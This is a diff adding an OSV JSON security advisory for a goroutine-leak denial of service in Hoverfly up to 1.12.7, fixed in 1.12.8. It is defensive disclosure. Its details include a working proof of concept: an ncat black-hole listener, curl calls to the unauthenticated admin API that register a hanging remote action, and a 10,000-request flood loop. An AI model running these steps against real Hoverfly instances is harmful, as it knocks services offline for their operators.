@@ -1,0 +1,54 @@
+{
+  "id": "GHSA-42j2-w334-qxw7",
+  "modified": "2026-07-14T18:15:15.108737079Z",
+  "published": "2026-07-14T18:04:55Z",
+  "aliases": [
+    "CVE-2026-50018"
+  ],
+  "summary": "Hoverfly: Denial of Service via Goroutine Leak in Remote Post-Serve Actions",
+  "details": "### Summary:\n\nRemote post-serve actions use `http.DefaultClient` without any timeout configuration. When the remote endpoint is unreachable or intentionally slow (accepts TCP connection but never responds), each triggered proxy request spawns a goroutine that blocks indefinitely on `http.DefaultClient.Do()`. An attacker can cause unbounded goroutine accumulation leading to memory exhaustion and process crash (OOM kill). Unlike local post-serve action execution, this requires no binary execution, only a URL pointing to a non-responsive endpoint.\n\n### Details:\n\n**1. Remote actions executed in goroutines without timeout (`core/hoverfly.go:224-228`):**\n\n```go\ngo postServeAction.Execute(result.Pair, journalIDChannel, hf.Journal)\n```\n\nPost-serve actions are executed in separate goroutines with no recovery wrapper.\n\n**2. HTTP client has no timeout (`core/action/action.go:128-143`):**\n\n```go\nreq, err := http.NewRequest(\"POST\", action.Remote, bytes.NewBuffer(pairViewBytes))\n// ...\nresp, err := http.DefaultClient.Do(req)  // No timeout! Blocks forever.\n```\n\n`http.DefaultClient` has zero timeout by default in Go. If the remote server:\n- Accepts the TCP connection but never sends a response\n- Establishes TLS but never completes the handshake  \n- Uses TCP window size 0 (flow control stall)\n\n...the goroutine blocks indefinitely. There is no context cancellation, no deadline, and no cleanup.\n\n**3. No goroutine limit or backpressure:**\n\nThere is no limit on how many post-serve action goroutines can be active simultaneously. Each matching proxy request spawns a new one unconditionally.\n\n**4. The goroutine is never cleaned up:**\n\nThe only exit path from `Execute()` is a successful (or failed) HTTP response. A non-responding server means the goroutine lives until the process is killed.\n\n### Environment:\n\n- **Hoverfly version:** v1.12.7\n- **Operating System:** macOS Darwin 25.4.0\n- **Go version:** 1.26.2\n- **Configuration:** Default (no flags required)\n\n### POC:\n\n**Step 1: Start a black-hole TCP listener (accepts connections, never responds)**\n\n```bash\n# Option A: Use ncat\nncat -l -k 9999 \u0026\n\n# Option B: Use a non-routable IP (connections hang at TCP SYN)\n# 192.0.2.1 is TEST-NET-1, guaranteed non-routable\n# This causes http.DefaultClient to block on TCP connect timeout (which is also unlimited)\n```\n\n**Step 2: Register remote post-serve action pointing to the black hole**\n\n```bash\ncurl -X PUT http://localhost:8888/api/v2/hoverfly/post-serve-action \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\n    \"actionName\": \"leak\",\n    \"remote\": \"http://192.0.2.1:9999/blackhole\",\n    \"delayInMs\": 0\n  }'\n```\n\n**Step 3: Load a catch-all simulation**\n\n```bash\ncurl -X PUT http://localhost:8888/api/v2/simulation \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\n    \"data\": {\n      \"pairs\": [{\n        \"request\": {\"path\": [{\"matcher\": \"glob\", \"value\": \"*\"}]},\n        \"response\": {\"status\": 200, \"body\": \"ok\", \"postServeAction\": \"leak\"}\n      }],\n      \"globalActions\": {\"delays\": [], \"delaysLogNormal\": []}\n    },\n    \"meta\": {\"schemaVersion\": \"v5.2\"}\n  }'\n```\n\n**Step 4: Flood with requests**\n\n```bash\n# Each request spawns an immortal goroutine\nfor i in $(seq 1 10000); do\n    curl -s -x http://localhost:8500 \"http://target.com/req${i}\" \u0026\n    # Throttle to avoid local FD exhaustion\n    [ $((i % 100)) -eq 0 ] \u0026\u0026 wait\ndone\n```\n\n**Verified memory impact on Hoverfly v1.12.7:**\n\n```\nMemory before: 20,064 KB\nMemory after 50 requests: 23,376 KB\nMemory increase: 3,312 KB (66 KB per goroutine)\n```\n\nAt this rate:\n- 1,000 requests = ~64 MB leaked\n- 10,000 requests = ~640 MB leaked\n- 100,000 requests = ~6.4 GB leaked → OOM crash\n\n### Impact:\n\nAn attacker with access to the admin API (unauthenticated by default) can cause a complete denial of service by:\n\n1. Registering a remote post-serve action pointing to a non-responsive endpoint.\n2. Loading a catch-all simulation that triggers the action on every request.\n3. Sending proxy traffic, each request permanently leaks a goroutine and its associated memory.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/SpectoLabs/hoverfly",
+        "purl": "pkg:golang/github.com/SpectoLabs/hoverfly"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.12.8"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 1.12.7",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/07/GHSA-42j2-w334-qxw7/GHSA-42j2-w334-qxw7.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/SpectoLabs/hoverfly/security/advisories/GHSA-42j2-w334-qxw7"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/SpectoLabs/hoverfly/pull/1228"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/SpectoLabs/hoverfly"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/SpectoLabs/hoverfly/releases/tag/v1.12.8"
+    }
+  ]
+}
